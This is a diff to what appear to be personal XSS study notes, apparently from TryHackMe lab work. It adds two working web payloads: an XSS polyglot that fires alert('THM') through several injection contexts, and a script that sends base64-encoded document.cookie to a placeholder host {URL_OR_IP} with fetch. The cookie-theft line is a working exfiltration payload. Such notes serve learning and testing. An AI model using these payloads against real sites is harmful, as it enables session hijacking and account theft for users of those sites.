@@ -25,3 +25,18 @@ Closign the input tag
 The important part of the payload is the "> which closes the value parameter and then closes the input tag.
 
 ```
+
+Polyglots
+
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+
+```
+
+Fetch Cookie using Javascript
+
+```
+</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
+
+```
+
